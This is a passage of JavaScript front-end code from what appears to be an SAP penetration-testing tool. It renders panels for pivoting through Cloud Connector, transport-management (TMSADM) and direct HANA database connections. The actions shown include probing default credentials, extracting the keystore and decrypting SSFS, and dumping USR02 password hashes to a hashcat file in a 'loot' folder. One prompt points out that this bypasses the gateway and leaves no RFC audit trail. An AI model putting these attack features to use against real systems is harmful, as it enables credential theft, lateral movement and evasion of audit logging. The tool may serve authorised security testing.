            const ppHi = (auth === 'KERBEROS' || auth === 'X509_GENERAL');
            const resList = (m.path_allowlist || []).filter(r => r && r.path).slice(0, 4)
              .map(r => `<div style="font-family:monospace;color:${(r.policy === 'PATH_AND_ALL_SUB_PATHS' || !r.exact_match_only) ? '#f0883e' : '#cfd9df'}">${escHtml(r.path)}${(r.policy === 'PATH_AND_ALL_SUB_PATHS' || !r.exact_match_only) ? ' /*' : ''}</div>`).join('');
            const moreRes = (m.path_allowlist || []).filter(r => r && r.path).length - 4;
            let reachCell;
            if (m.reachable === true) {
              const sigTip = m.probe_signature ? ' · ' + m.probe_signature : '';
              reachCell = `<span style="color:#3fb950;font-weight:bold" title="${escHtml(m.last_probed_at || '')}${escHtml(sigTip)}">&#10003; ${m.probe_latency_ms || 0}ms</span>`;
            } else if (m.reachable === false) {
              reachCell = `<span style="color:#f85149;font-weight:bold" title="${escHtml(m.probe_error || 'unreachable')}">&#10007; fail</span>`;
            } else {
              reachCell = '<span style="color:#8b949e">—</span>';
            }
            return `
              <tr>
                <td style="padding:4px 6px;border-bottom:1px solid #21262d;font-family:monospace">${escHtml(m.virtual_host || '?')}:${m.virtual_port || '?'}</td>
                <td style="padding:4px 6px;border-bottom:1px solid #21262d;font-family:monospace">${escHtml(m.internal_host || '?')}:${m.internal_port || '?'}</td>
                <td style="padding:4px 6px;border-bottom:1px solid #21262d">${escHtml((m.protocol || '').toUpperCase())}</td>
                <td style="padding:4px 6px;border-bottom:1px solid #21262d;font-weight:bold">${escHtml(m.sid || '')}</td>
                <td style="padding:4px 6px;border-bottom:1px solid #21262d;color:${ppHi ? '#f0883e' : '#8b949e'}">${escHtml(auth || '-')}</td>
                <td style="padding:4px 6px;border-bottom:1px solid #21262d;text-align:center">${reachCell}</td>
                <td style="padding:4px 6px;border-bottom:1px solid #21262d">${resList || '<span style="color:#8b949e">-</span>'}${moreRes > 0 ? `<div style="color:#8b949e;font-size:10px">+ ${moreRes} more</div>` : ''}</td>
              </tr>`;
          }).join('')}
        </tbody>
      </table>`}
    </div>
    <div class="detail-section">
      <h4>Actions</h4>
      <div style="display:flex;flex-direction:column;gap:6px">
        <button class="ctx-btn" onclick="showSCCCredModal('${escHtml(host)}')" style="background:#21262d;border:1px solid #30363d;color:#e6edf3;padding:6px 10px;border-radius:4px;cursor:pointer;text-align:left">&#128273; Set Credentials <span style="color:#8b949e;font-size:10px">(stored, auto-fills pull/extract)</span></button>
        <button class="ctx-btn" onclick="sccProbeCreds('${escHtml(host)}')" style="background:#21262d;border:1px solid #30363d;color:#e6edf3;padding:6px 10px;border-radius:4px;cursor:pointer;text-align:left">&#128273; Probe default creds <span style="color:#8b949e;font-size:10px">(1 POST · Administrator/manage)</span></button>
        <button class="ctx-btn" onclick="sccPullMappings('${escHtml(host)}')" style="background:#21262d;border:1px solid #30363d;color:#e6edf3;padding:6px 10px;border-radius:4px;cursor:pointer;text-align:left">&#128194; Pull mappings <span style="color:#8b949e;font-size:10px">(auto-fills if creds saved)</span></button>
        <button class="ctx-btn" onclick="sccProbeMappings('${escHtml(host)}')" style="background:#21262d;border:1px solid #30363d;color:#e6edf3;padding:6px 10px;border-radius:4px;cursor:pointer;text-align:left">&#128225; Probe mappings <span style="color:#8b949e;font-size:10px">(TCP/HTTP smoke test)</span></button>
        <button class="ctx-btn" onclick="sccExtractKeystore('${escHtml(host)}')" style="background:#21262d;border:1px solid #f85149;color:#f85149;padding:6px 10px;border-radius:4px;cursor:pointer;text-align:left">&#128272; Extract keystore + decrypt SSFS <span style="color:#8b949e;font-size:10px">(full backup zip — crown jewels)</span></button>
      </div>
    </div>
  `;
  panel.classList.add('visible');
  if (refresh && preservedScroll) panel.scrollTop = preservedScroll;
}

// -------- CTS/TMS pivot (Bundle 1) --------

function _getTMSDest(srcSid, target, domain) {
  const src = mapState.nodes[srcSid];
  if (!src) return null;
  return (src.tms_destinations || []).find(
    d => d.target_sid === target && d.domain === domain) || null;
}

async function runTMSDiscover(srcSid) {
  console.log(`[TMS] runTMSDiscover: ${srcSid}`);
  flashActivity(`${srcSid}: CTS/TMS discover`, 4000);
  const r = await api('POST', `node/${srcSid}/tms/discover`, {});
  if (r && r.error) { alert(`TMS discover failed: ${r.error}`); return; }
  startPolling();
}

async function runTMSTest(srcSid, target, domain, opts) {
  opts = opts || {};
  // If the operator typed a host into the modal's manual-host input,
  // pass it through — the probe persists it to dest.target_host so
  // subsequent buffer / history / propagate calls skip the (failed)
  // TMSCSYS auto-resolution.
  let host = (opts.target_host || '').trim();
  if (!host) {
    const inp = document.getElementById(
      `tms-manual-host-${srcSid}-${target}-${domain}`);
    if (inp) host = (inp.value || '').trim();
  }
  const hostLbl = host ? ` (host ${host})` : '';
  console.log(`[TMS] runTMSTest: ${srcSid}/${target}/${domain}${hostLbl}`);
  flashActivity(`${srcSid}: TMS test → TMSADM@${target}${hostLbl}`, 4000);
  const body = { target_sid: target, domain };
  if (host) body.target_host = host;
  await api('POST', `node/${srcSid}/tms/test`, body);
  startPolling();
}

async function runTMSReadBuffer(srcSid, target) {
  const r = await api('POST', `node/${srcSid}/tms/read_buffer`,
    { target_sid: target });
  if (r && r.error) { alert(`Buffer read failed: ${r.error}`); return; }
  _showTMSListOverlay('TMSBUFFER on ' + target,
    // Real TMSBUFFER columns on modern S/4 — matches the DDIC
    // definition, not the (wrong) names in earlier build.
    ['BUFPOS','TRKORR','SYSNAM','DOMNAM','IMPFLG','TRFUNC','UMODES','MAXRC'],
    r.rows || []);
}

async function runTMSHistory(srcSid, target) {
  const r = await api('POST', `node/${srcSid}/tms/history`,
    { target_sid: target, limit: 100 });
  if (r && r.error) { alert(`History read failed: ${r.error}`); return; }
  _showTMSListOverlay('Recent transports on ' + target,
    ['TRKORR','TRFUNCTION','TRSTATUS','AS4USER','AS4DATE','AS4TIME'],
    r.rows || []);
}

function _showTMSListOverlay(title, cols, rows) {
  let existing = document.getElementById('tms-list-overlay');
  if (existing) existing.remove();
  const div = document.createElement('div');
  div.id = 'tms-list-overlay';
  div.style = 'position:fixed;top:8%;left:12%;right:12%;bottom:8%;'
    + 'background:#0d1117;border:2px solid #39d1c4;border-radius:6px;'
    + 'z-index:10000;padding:12px 16px;overflow:auto;'
    + 'box-shadow:0 12px 40px rgba(0,0,0,0.7);font-family:monospace;'
    + 'color:#e6edf3;font-size:12px';
  const th = cols.map(c =>
    `<th style="text-align:left;padding:4px 8px;border-bottom:1px solid #30363d;color:#39d1c4">${escHtml(c)}</th>`).join('');
  const tr = rows.map(row =>
    '<tr>' + cols.map(c =>
      `<td style="padding:4px 8px;border-bottom:1px solid #21262d;user-select:text">${escHtml(String(row[c] === undefined ? '' : row[c]))}</td>`
    ).join('') + '</tr>').join('');
  div.innerHTML = `
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
      <b style="color:#39d1c4">${escHtml(title)}</b>
      <span style="color:#8b949e;margin-left:auto;margin-right:12px">${rows.length} row(s)</span>
      <button class="btn" onclick="this.closest('#tms-list-overlay').remove()">Close</button>
    </div>
    <div style="overflow:auto;max-height:calc(100% - 60px);user-select:text">
      <table style="border-collapse:collapse;min-width:100%"><thead><tr>${th}</tr></thead><tbody>${tr}</tbody></table>
    </div>
  `;
  document.body.appendChild(div);
}

function showTMSCtxMenu(e, srcSid, target, domain) {
  e.preventDefault(); e.stopPropagation();
  const dest = _getTMSDest(srcSid, target, domain);
  if (!dest) return;
  // Dedicated container — MUST NOT reuse #ctx-menu, or the SAP-node
  // template it holds (Import Local Transport, Add Credentials, …)
  // gets clobbered by our innerHTML assign below and the next
  // showCtxMenu() call on the parent node has nothing to restyle.
  hideCtxMenu(); hideSCCCtxMenu(); hideBTPCtxMenu(); hideDBCONCtxMenu();
  const menu = document.getElementById('tms-ctx-menu');
  if (!menu) return;
  const testLbl = dest.tested
    ? (dest.logon_ok ? 'Re-test logon &#10003;' : 'Re-test logon &#10007;')
    : 'Test TMSADM logon';
  const bufLbl  = dest.logon_ok
    ? `Read TMSBUFFER (${dest.buffer_count || 0} known)`
    : 'Read TMSBUFFER (needs logon)';
  const histLbl = dest.logon_ok
    ? 'Read recent transports (E070)'
    : 'Read recent transports (needs logon)';
  const ctrlLbl = dest.is_controller
    ? ' — 🎯 DOMAIN CONTROLLER' : '';
  menu.innerHTML = `
    <div class="ctx-header">TMSADM@${escHtml(target)} · ${escHtml(domain)}${ctrlLbl}</div>
    <div class="ctx-item" onclick="runTMSTest('${escHtml(srcSid)}','${escHtml(target)}','${escHtml(domain)}');hideTMSCtxMenu()">${testLbl}</div>
    <div class="ctx-item${dest.logon_ok ? '' : ' ctx-item-disabled'}" onclick="runTMSReadBuffer('${escHtml(srcSid)}','${escHtml(target)}');hideTMSCtxMenu()">${bufLbl}</div>
    <div class="ctx-item${dest.logon_ok ? '' : ' ctx-item-disabled'}" onclick="runTMSHistory('${escHtml(srcSid)}','${escHtml(target)}');hideTMSCtxMenu()">${histLbl}</div>
    <div class="ctx-item" onclick="showTMSDetail('${escHtml(srcSid)}','${escHtml(target)}','${escHtml(domain)}');hideTMSCtxMenu()">Show details</div>
  `;
  menu.style.left = e.clientX + 'px';
  menu.style.top  = e.clientY + 'px';
  menu.classList.add('visible');
}

function showTMSDetail(srcSid, target, domain, opts) {
  const dest = _getTMSDest(srcSid, target, domain);
  if (!dest) return;
  const panel = document.getElementById('detail-panel');
  if (!panel) return;
  const sidKey = `tms:${srcSid}:${target}:${domain}`;
  const refresh = !!(opts && opts.refresh);
  // Toggle-close ONLY on operator click.  The state-poll refresh
  // path passes {refresh:true} and MUST skip this branch, otherwise
  // the panel appears briefly then hides itself on the next tick.
  // (Same bug shape as the trust-chains flicker + DBCON drawer.)
  if (!refresh && panel.classList.contains('visible')
      && panel.dataset.sid === sidKey) {
    _closeDetailPanel();
    return;
  }
  const preservedScroll = refresh ? (panel.scrollTop || 0) : 0;
  // Snapshot the manual-host input so the state-poll refresh doesn't
  // wipe what the operator is currently typing.  We restore its value,
  // focus, and caret position after the innerHTML swap.  Without this
  // the panel re-renders every ~1s and the field becomes untypeable.
  const manualHostId = `tms-manual-host-${srcSid}-${target}-${domain}`;
  let manualHostSnapshot = null;
  if (refresh) {
    const oldInp = document.getElementById(manualHostId);
    if (oldInp) {
      manualHostSnapshot = {
        value:  oldInp.value,
        focus:  (document.activeElement === oldInp),
        start:  oldInp.selectionStart,
        end:    oldInp.selectionEnd,
      };
    }
  }
  panel.setAttribute('data-view', 'tms');
  panel.dataset.sid = sidKey;
  const stateChip = dest.pwned ? '<span class="risk-badge risk-CRITICAL">&#9889; PWNED</span>'
    : dest.logon_ok ? (dest.is_controller
        ? '<span class="risk-badge risk-CRITICAL">CTRL logon OK</span>'
        : '<span class="risk-badge risk-HIGH">Logon OK</span>')
    : dest.tested ? '<span class="risk-badge risk-LOW">Logon failed</span>'
    : '<span class="risk-badge">Untested</span>';
  const rolesLine = (dest.tmsadm_roles && dest.tmsadm_roles.length)
    ? dest.tmsadm_roles.map(r =>
        `<span style="background:#21262d;padding:1px 6px;border-radius:3px;margin-right:4px;color:${r === 'SAP_ALL' ? '#f85149' : '#c9d1d9'};font-weight:${r === 'SAP_ALL' ? 'bold' : 'normal'}">${escHtml(r)}</span>`
      ).join(' ')
    : '<span style="color:#6e7681">not yet fetched</span>';
  panel.innerHTML = `
    <h3>TMSADM@${escHtml(target)}<span style="color:#8b949e;font-weight:normal;font-size:12px"> · domain ${escHtml(domain)}</span></h3>
    <div class="info-row"><span class="info-label">Source:</span><span class="info-val">${escHtml(srcSid)}</span></div>
    <div class="info-row"><span class="info-label">Target host:</span><span class="info-val mono">${escHtml(dest.target_host || '?')}</span></div>
    <div class="info-row"><span class="info-label">Target client:</span><span class="info-val">${escHtml(dest.target_client || '000')}</span></div>
    <div class="info-row"><span class="info-label">Domain ctrl:</span><span class="info-val">${dest.is_controller ? '🎯 <b>YES</b> — landscape-wide TMS rights' : 'no'}</span></div>
    <div class="info-row"><span class="info-label">Status:</span><span class="info-val">${stateChip}</span></div>
    <div class="info-row"><span class="info-label">TMSADM roles:</span><span class="info-val">${rolesLine}</span></div>
    <div class="info-row"><span class="info-label">SAP_ALL:</span><span class="info-val" style="color:${dest.tmsadm_has_sap_all ? '#f85149' : '#8b949e'};font-weight:${dest.tmsadm_has_sap_all ? 'bold' : 'normal'}">${dest.tmsadm_has_sap_all ? '⚡ YES' : 'no'}</span></div>
    <div class="info-row"><span class="info-label">Pending imports:</span><span class="info-val">${dest.buffer_count || 0}</span></div>
    ${dest.tested_at ? `<div class="info-row"><span class="info-label">Tested at:</span><span class="info-val" style="font-size:11px;color:#8b949e">${escHtml(dest.tested_at)}</span></div>` : ''}
    ${(dest.host_reachable && !dest.logon_ok) ? `<div class="info-row"><span class="info-label">Reachable via:</span><span class="info-val" style="color:#d29922">&#9888; ${escHtml(dest.reachable_via || '')} — TMSADM logon failed, but host is up</span></div>` : ''}
    ${(dest.host_reachable && dest.logon_ok) ? `<div class="info-row"><span class="info-label">Reachable via:</span><span class="info-val" style="color:#3fb950">&#10003; ${escHtml(dest.reachable_via || '')}</span></div>` : ''}
    ${dest.error ? `<div class="info-section" style="color:#f85149;font-size:11px">${escHtml(dest.error)}</div>` : ''}
    ${(dest.fallback_error && !dest.host_reachable) ? `<div class="info-section" style="color:#d29922;font-size:11px">Fallback: ${escHtml(dest.fallback_error)}</div>` : ''}
    ${(!dest.target_host || (dest.tested && !dest.logon_ok)) ? `
      <div class="info-section" style="margin-top:10px;padding:8px 10px;background:#161b22;border:1px solid #30363d;border-radius:4px">
        <div style="font-size:11px;color:#8b949e;margin-bottom:4px">
          Manual host override — paste the target's ASHOST (IP or FQDN)
          if TMSCSYS auto-resolution couldn't find it. Persisted to
          <code style="color:#c9d1d9">dest.target_host</code> after a
          successful re-test.
        </div>
        <input type="text" id="tms-manual-host-${escHtml(srcSid)}-${escHtml(target)}-${escHtml(domain)}"
               placeholder="e.g. 192.168.2.210 or twp.lab.local"
               style="width:100%;background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:4px 6px;border-radius:3px;font-family:monospace;font-size:12px"
               value="${escHtml(dest.target_host || '')}"/>
      </div>` : ''}
    <div style="text-align:right;margin-top:12px;display:flex;gap:6px;justify-content:flex-end;flex-wrap:wrap">
      <button class="btn" onclick="runTMSTest('${escHtml(srcSid)}','${escHtml(target)}','${escHtml(domain)}')">${dest.tested ? 'Re-test' : 'Test logon'}</button>
      ${dest.logon_ok ? `<button class="btn" onclick="runTMSReadBuffer('${escHtml(srcSid)}','${escHtml(target)}')">TMSBUFFER</button>` : ''}
      ${dest.logon_ok ? `<button class="btn" onclick="runTMSHistory('${escHtml(srcSid)}','${escHtml(target)}')">History</button>` : ''}
      <button class="btn" onclick="_closeDetailPanel()">Close</button>
    </div>
  `;
  panel.classList.add('visible');
  if (refresh && preservedScroll) panel.scrollTop = preservedScroll;
  // Restore the manual-host input after the innerHTML swap so the
  // operator's mid-typing keystrokes survive the polling refresh.
  if (manualHostSnapshot) {
    const newInp = document.getElementById(manualHostId);
    if (newInp) {
      newInp.value = manualHostSnapshot.value;
      if (manualHostSnapshot.focus) {
        newInp.focus();
        try {
          newInp.setSelectionRange(manualHostSnapshot.start,
                                    manualHostSnapshot.end);
        } catch (_e) { /* selection API unavailable for this input type */ }
      }
    }
  }
}

function _getDBCONEdge(srcSid, conName) {
  const src = mapState.nodes[srcSid];
  if (!src) return null;
  return (src.dbcon_edges || []).find(e => e.con_name === conName) || null;
}

async function runDBCONTest(srcSid, conName) {
  flashActivity(`${srcSid}: DBCON test → ${conName}`, 4000);
  await api('POST', `node/${srcSid}/dbcon/test`, { con_name: conName });
  startPolling();
}

async function runDBCONDumpUsr02(srcSid, conName) {
  console.log(`[DBCON] runDBCONDumpUsr02: ${srcSid} / ${conName}`);
  const edge = _getDBCONEdge(srcSid, conName);
  if (!edge) return;
  if (!(edge.reachable && edge.is_sap_shape)) {
    alert('USR02 dump requires the DBCON target to be a SAP-shape DB (USR02 present).\n\nRun Test Connection first.');
    return;
  }
  if (!confirm(
    `Dump USR02 hashes from ${edge.target_sid || conName}?\n\n` +
    `This SELECTs every row of USR02 (BNAME, MANDT, BCODE, PASSCODE,\n` +
    `PWDSALTEDHASH) via direct HANA connection to ${edge.host}:${edge.port}\n` +
    `and writes a hashcat-formatted file to loot/dbcon/.\n\n` +
    `Bypasses the source SAP's gateway entirely — no RFC audit trail on source.`
  )) return;
  flashActivity(`${srcSid}: DBCON dump USR02 → ${conName}`, 6000);
  await api('POST', `node/${srcSid}/dbcon/dump_usr02`, { con_name: conName });
  startPolling();
}

async function runDBCONDumpAuthTables(srcSid, conName) {
  console.log(`[DBCON] runDBCONDumpAuthTables: ${srcSid} / ${conName}`);
  const edge = _getDBCONEdge(srcSid, conName);
  if (!edge) return;
  if (!(edge.reachable && edge.is_sap_shape)) {
    alert('Auth-table dump requires a SAP-shape reachable DBCON.\n\nRun Test Connection first.');
    return;
  }
  if (!confirm(
    `Dump USR04 / UST04 / USRBF2 from ${edge.target_sid || conName}?\n\n` +
    `This SELECTs every row from all three tables via direct HANA\n` +
    `on ${edge.host}:${edge.port} and writes 3 CSVs to loot/dbcon/.\n\n` +
    `USR04  = profile assignments\n` +
    `UST04  = user↔profile join\n` +
    `USRBF2 = per-user compiled auth buffer`
  )) return;
  flashActivity(`${srcSid}: DBCON auth-table dump → ${conName}`, 8000);
  await api('POST', `node/${srcSid}/dbcon/dump_auth_tables`,
    { con_name: conName });
  startPolling();
}

async function runDBCONCustomSQL(srcSid, conName) {
  console.log(`[DBCON] runDBCONCustomSQL: ${srcSid} / ${conName}`);
  const edge = _getDBCONEdge(srcSid, conName);
  if (!edge) return;
  if (!edge.reachable) {
    alert('Custom SQL needs a reachable DBCON — Test Connection first.');
    return;
  }
  _showDBCONCustomSQLOverlay(srcSid, conName, edge);
}

function _showDBCONCustomSQLOverlay(srcSid, conName, edge) {
  let existing = document.getElementById('dbcon-sql-overlay');
  if (existing) existing.remove();
  const div = document.createElement('div');
  div.id = 'dbcon-sql-overlay';
  div.style = 'position:fixed;top:8%;left:10%;right:10%;bottom:8%;'
    + 'background:#0d1117;border:2px solid #58a6ff;border-radius:6px;'
    + 'z-index:10000;padding:12px 16px;overflow:auto;'
    + 'box-shadow:0 12px 40px rgba(0,0,0,0.7);font-family:monospace;'
    + 'color:#e6edf3;font-size:12px;display:flex;flex-direction:column';
  div.innerHTML = `
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;flex-shrink:0">
      <b style="color:#58a6ff">DBCON custom SELECT — ${escHtml(conName)} @ ${escHtml(edge.host)}:${edge.port}</b>
      <button class="btn" onclick="this.closest('#dbcon-sql-overlay').remove()">Close</button>
    </div>
    <div style="color:#8b949e;font-size:10px;margin-bottom:6px;flex-shrink:0">
      Read-only. INSERT / UPDATE / DELETE / DROP / ALTER / CREATE / GRANT / CALL etc. are blocked.
      Result set capped at 5000 rows.
    </div>
    <textarea id="dbcon-sql-text" spellcheck="false"
      style="width:100%;min-height:110px;background:#010409;color:#e6edf3;border:1px solid #30363d;border-radius:3px;padding:6px 8px;font-family:monospace;font-size:12px;flex-shrink:0"
      placeholder="SELECT * FROM SAPHANADB.T000">SELECT MANDT, MTEXT, ORT01 FROM SAPHANADB.T000</textarea>
    <div style="display:flex;gap:6px;margin-top:6px;align-items:center;flex-shrink:0">
      <label style="color:#8b949e">Limit:</label>
      <input id="dbcon-sql-limit" type="number" value="200" min="1" max="5000"
        style="width:80px;background:#010409;border:1px solid #30363d;color:#e6edf3;padding:3px 6px;border-radius:3px" />
      <button class="btn" style="background:#238636;color:#fff;padding:5px 14px;font-weight:bold"
        onclick="_runDBCONCustomSQLNow('${escHtml(srcSid)}','${escHtml(conName)}')">&#9654; Run</button>
      <span style="color:#8b949e;font-size:10px;margin-left:auto">
        Tip: Ctrl+Enter runs the query
      </span>
    </div>
    <div id="dbcon-sql-result" style="margin-top:10px;flex:1;overflow:auto;min-height:200px"></div>
  `;
  document.body.appendChild(div);
  const ta = document.getElementById('dbcon-sql-text');
  ta.focus();
  ta.setSelectionRange(ta.value.length, ta.value.length);
  ta.addEventListener('keydown', ev => {
    if ((ev.ctrlKey || ev.metaKey) && ev.key === 'Enter') {
      ev.preventDefault();
      _runDBCONCustomSQLNow(srcSid, conName);
    }
  });
}

async function _runDBCONCustomSQLNow(srcSid, conName) {
  const sql = document.getElementById('dbcon-sql-text').value.trim();
  const limit = parseInt(
    document.getElementById('dbcon-sql-limit').value, 10) || 200;
  const resDiv = document.getElementById('dbcon-sql-result');
  if (!sql) return;
  resDiv.innerHTML = '<span style="color:#8b949e">Running…</span>';
  const r = await api('POST', `node/${srcSid}/dbcon/custom_sql`,
    { con_name: conName, sql, limit });
  if (r && r.error) {
    resDiv.innerHTML = `<pre style="color:#f85149;white-space:pre-wrap;user-select:text">${escHtml(r.error)}</pre>`;
    return;
  }
  if (!r || !r.ok) {
    resDiv.innerHTML = `<pre style="color:#f85149">unexpected response</pre>`;
    return;
  }
  // Cache result on the overlay so the save-to-loot handler can
  // grab columns+rows without a re-fetch (same pattern peek uses).
  const overlay = document.getElementById('dbcon-sql-overlay');
  if (overlay) {
    overlay._sqlCols = r.columns || [];
    overlay._sqlRows = r.rows || [];
    overlay._sqlText = sql;
  }
  const cols = (r.columns || []).map(c =>
    `<th style="text-align:left;padding:4px 8px;border-bottom:1px solid #30363d;color:#58a6ff;position:sticky;top:0;background:#0d1117;z-index:1">${escHtml(c)}</th>`).join('');
  // user-select:text explicitly + white-space:pre-wrap + word-break
  // so cells expand vertically, text is fully visible and cleanly
  // selectable by mouse or keyboard.  vertical-align:top keeps
  // multi-line rows readable.
  const rows = (r.rows || []).map(row =>
    '<tr>' + row.map(v =>
      `<td style="padding:4px 8px;border-bottom:1px solid #21262d;vertical-align:top;max-width:520px;white-space:pre-wrap;word-break:break-word;user-select:text">${v === null ? '<i style="color:#6e7681">null</i>' : escHtml(String(v))}</td>`
    ).join('') + '</tr>').join('');
  resDiv.innerHTML = `
    <div style="color:#8b949e;margin-bottom:6px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:6px">
      <span>${(r.rows||[]).length} row(s), ${(r.columns||[]).length} col(s)${r.truncated ? ' — <b style="color:#d29922">truncated at limit</b>' : ''}</span>
      <span style="display:flex;gap:6px">
        <button class="btn" onclick="_copyDBCONSQLToClipboard()" title="Copy all rows to clipboard as TSV">&#128203; Copy TSV</button>
        <button class="btn" style="background:#238636;color:#fff" onclick="_saveDBCONCustomSQLAs('${escHtml(srcSid)}','${escHtml(conName)}','csv')">&#8681; CSV</button>
        <button class="btn" style="background:#238636;color:#fff" onclick="_saveDBCONCustomSQLAs('${escHtml(srcSid)}','${escHtml(conName)}','json')">&#8681; JSON</button>
      </span>
    </div>
    <div style="user-select:text;overflow:auto;max-height:calc(100vh - 400px);border:1px solid #21262d;border-radius:3px">
      <table style="border-collapse:collapse;min-width:100%;user-select:text">
        <thead><tr>${cols}</tr></thead>
        <tbody>${rows}</tbody>
      </table>
    </div>
  `;
}

async function _saveDBCONCustomSQLAs(srcSid, conName, fmt) {
  const overlay = document.getElementById('dbcon-sql-overlay');
  if (!overlay || !overlay._sqlRows || !overlay._sqlRows.length) {
    alert('No rows to export.'); return;
  }
  // Reuse the peek save-CSV route — it's generic (takes columns+rows
  // and writes to loot).  Synthetic schema/table so the filename
  // reads as a custom-SQL dump instead of a table peek.
  const ts = Math.floor(Date.now() / 1000);
  const r = await api('POST', `node/${srcSid}/dbcon/save_peek_csv`, {
    con_name: conName, schema: 'custom_sql', table: 'query_' + ts,
    columns: overlay._sqlCols, rows: overlay._sqlRows, format: fmt });
  if (r && r.error) { alert(`Save failed: ${r.error}`); return; }
  if (r && r.ok) {
    alert(`${(fmt||'csv').toUpperCase()} saved to loot:\n${r.loot_path}\n\n` +
      `${r.rows} row(s), ${r.columns} column(s).\n\n` +
      `Original SQL:\n${overlay._sqlText || ''}`);
  }
}

function _copyDBCONSQLToClipboard() {
  const overlay = document.getElementById('dbcon-sql-overlay');
  if (!overlay) return;
  const cols = overlay._sqlCols || [];
  const rows = overlay._sqlRows || [];
  // TSV — tabs between cells, newlines between rows.  Pastes cleanly
  // into Excel / Google Sheets / most editors.  Newlines within
  // cells replaced with \n literal so row boundaries stay intact.
  const esc = v => v === null ? ''
    : String(v).replace(/\t/g, ' ').replace(/\r?\n/g, '\\n');
  const tsv = [cols.map(esc).join('\t')]
    .concat(rows.map(r => r.map(esc).join('\t')))
    .join('\n');
  navigator.clipboard.writeText(tsv).then(
    () => flashActivity(`Copied ${rows.length} row(s) as TSV`, 2000),
    (err) => alert('Clipboard write failed: ' + err));
}

async function runDBCONReconSweep(srcSid, conName) {
  console.log(`[DBCON] runDBCONReconSweep: ${srcSid} / ${conName}`);
  const edge = _getDBCONEdge(srcSid, conName);
  if (!edge) return;
  if (!edge.reachable) {
    alert('Recon sweep needs a reachable DBCON — Test Connection first.');
    return;
  }
  flashActivity(`${srcSid}: DBCON HANA recon → ${conName}`, 5000);
  await api('POST', `node/${srcSid}/dbcon/recon_sweep`,
    { con_name: conName });
  startPolling();
}

async function runDBCONDescribe(srcSid, conName, schema, table) {
  console.log(`[DBCON] runDBCONDescribe: ${srcSid}/${schema}.${table}`);
  const r = await api('POST', `node/${srcSid}/dbcon/describe_table`, {
    con_name: conName, schema, table });
  if (r && r.error) { alert(`Describe failed: ${r.error}`); return; }
  _showDBCONColumnsOverlay(schema, table, r);
}

function _showDBCONColumnsOverlay(schema, table, res) {
  let existing = document.getElementById('dbcon-cols-overlay');
  if (existing) existing.remove();
  const div = document.createElement('div');
  div.id = 'dbcon-cols-overlay';
  div.style = 'position:fixed;top:10%;left:20%;right:20%;bottom:10%;'
    + 'background:#0d1117;border:2px solid #58a6ff;border-radius:6px;'
    + 'z-index:10000;padding:12px 16px;overflow:auto;'
    + 'box-shadow:0 12px 40px rgba(0,0,0,0.7);font-family:monospace;'
    + 'color:#e6edf3;font-size:12px';
  const rows = (res.columns || []).map(c =>
    `<tr>
       <td style="padding:3px 8px;color:#8b949e;text-align:right">${c.position}</td>
       <td style="padding:3px 8px;color:#e6edf3;font-weight:bold">${escHtml(c.name)}</td>
       <td style="padding:3px 8px;color:#3fb950">${escHtml(c.type)}</td>
       <td style="padding:3px 8px;color:#8b949e;text-align:right">${c.len || ''}</td>
       <td style="padding:3px 8px;color:${c.nullable ? '#d29922' : '#f85149'}">${c.nullable ? 'NULL' : 'NOT NULL'}</td>
     </tr>`).join('');
  div.innerHTML = `
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
      <div><b style="color:#58a6ff">Columns — ${escHtml(schema)}.${escHtml(table)}</b>
        <span style="color:#8b949e;margin-left:12px">${(res.columns||[]).length} column(s)</span></div>
      <button class="btn" onclick="this.closest('#dbcon-cols-overlay').remove()">Close</button>
    </div>
    <div style="overflow:auto;max-height:calc(100% - 60px)">
      <table style="border-collapse:collapse;min-width:100%">
        <thead><tr>
          <th style="text-align:right;padding:4px 8px;border-bottom:1px solid #30363d;color:#58a6ff">#</th>
          <th style="text-align:left;padding:4px 8px;border-bottom:1px solid #30363d;color:#58a6ff">Column</th>
          <th style="text-align:left;padding:4px 8px;border-bottom:1px solid #30363d;color:#58a6ff">Type</th>
          <th style="text-align:right;padding:4px 8px;border-bottom:1px solid #30363d;color:#58a6ff">Length</th>
          <th style="text-align:left;padding:4px 8px;border-bottom:1px solid #30363d;color:#58a6ff">Nullable</th>
        </tr></thead>
        <tbody>${rows}</tbody>
      </table>
    </div>
  `;
  document.body.appendChild(div);
}

async function _saveDBCONPeekAs(srcSid, conName, schema, table, fmt) {
  const overlay = document.getElementById('dbcon-peek-overlay');
  if (!overlay) return;
  const rowsData = overlay._peekRows || [];
  const cols     = overlay._peekCols || [];
  if (!rowsData.length) { alert('No rows to export.'); return; }
  const r = await api('POST', `node/${srcSid}/dbcon/save_peek_csv`, {
    con_name: conName, schema, table,
    columns: cols, rows: rowsData, format: fmt });
  if (r && r.error) { alert(`Save failed: ${r.error}`); return; }
  if (r && r.ok) {
    alert(`${(fmt||'csv').toUpperCase()} saved to loot:\n${r.loot_path}\n\n` +
      `${r.rows} row(s), ${r.columns} column(s).`);
  }
}

async function _saveDBCONPeekCSV(srcSid, conName, schema, table) {
  // pywebview's embedded browser doesn't honor <a download> for
  // blob:/data: URLs — it navigates the current window and renders
  // the CSV as text.  Route through the server instead: POST the
  // in-memory rows to the backend which writes to loot/ and
  // returns the file path.  Matches the USR02 dump save pattern.
  const overlay = document.getElementById('dbcon-peek-overlay');
  if (!overlay) return;
  const rowsData = overlay._peekRows || [];
  const cols     = overlay._peekCols || [];
  if (!rowsData.length) { alert('No rows to export.'); return; }
  const r = await api('POST', `node/${srcSid}/dbcon/save_peek_csv`, {
    con_name: conName, schema, table,
    columns: cols, rows: rowsData });
  if (r && r.error) { alert(`Save failed: ${r.error}`); return; }
  if (r && r.ok) {
    alert(`CSV saved to loot:\n${r.loot_path}\n\n` +
      `${r.rows} row(s), ${r.columns} column(s).`);
  }
}

async function runDBCONPeekCustom(srcSid, conName) {
  console.log(`[DBCON] runDBCONPeekCustom: ${srcSid} / ${conName}`);
  const edge = _getDBCONEdge(srcSid, conName);
  if (!edge) return;
  if (!edge.reachable) {
    alert('Run "Test connection" first — peek needs a live driver connection.');
    return;
  }
  // Two-step prompt (schema, table) — some ops know exact table
  // names ahead of enumeration, or want to peek a system table
  // that was filtered out by the enumerator.
  const schema = prompt(
    `Peek an arbitrary table on ${edge.host}:${edge.port}\n\n` +
    `Schema (case-sensitive; HANA typically uppercase):`,
    'SAPHANADB');
  if (schema === null) return;
  const table = prompt(
